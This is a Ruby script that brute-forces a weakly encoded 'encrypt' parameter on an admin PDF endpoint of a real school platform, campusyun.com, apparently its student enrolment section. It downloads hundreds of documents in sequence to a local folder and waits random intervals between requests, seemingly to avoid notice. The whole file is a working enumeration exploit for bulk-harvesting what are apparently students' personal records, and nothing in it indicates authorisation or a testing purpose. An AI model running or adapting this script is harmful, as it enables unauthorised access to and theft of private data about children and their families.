#! /usr/bin/ruby

require "base64"
require "cgi"
require "open-uri"
require "tmpdir"
DIGITS = [
  # 0     1     2     3    4     5     6      7    8    9
  [-107, -106, -105, -104, -103, -102, -101, -100, -99, -98],
  # 0      1     2     3     4     5     6    7     8     9   
  [-108, -107, -106, -105, -104, -103, -102, -101, -100, -99],
  # 0  1   2   3     4   5   6     7     8     9   
  [97, 98, 99, 100, 101, 102, 103, 104, 105, 106]
]

if __FILE__ == $0
  tmpdir = '//Users/ronghai/temp' # Dir.mktmpdir
  school = ARGV[0] ? ARGV[0] : "szgyyqhlxx"
  min = ARGV[1] ? ARGV[1].to_i : 1
  max = ARGV[2] ? ARGV[2].to_i : 999
  puts tmpdir
  puts min
  puts max
  begin
    (min..max).each do |n|
      digits = n.to_s.split('').each_with_index.map{|digit, index|  DIGITS[index][digit.to_i]}
      file = Base64.encode64(digits.pack('c*')).chomp!
      url = "http://www.campusyun.com/campus/#{school}/xsbm/admin/index.php?s=/Admin/Pdf/index//encrypt/#{CGI::escape(file)}"
      puts n
      puts url
      download = open(url)
      IO.copy_stream(download, "%s/%s.%04d.pdf" % [tmpdir, school, n] )
      sleep rand(15)
    end
  rescue => error
    puts(error)
    # return
  end
  # `/usr/bin/env pdfunite #{tmpdir}/*.pdf #{Dir.home}/#{school}.pdf`
  # `rm -rf #{tmpdir}/*.pdf`
end

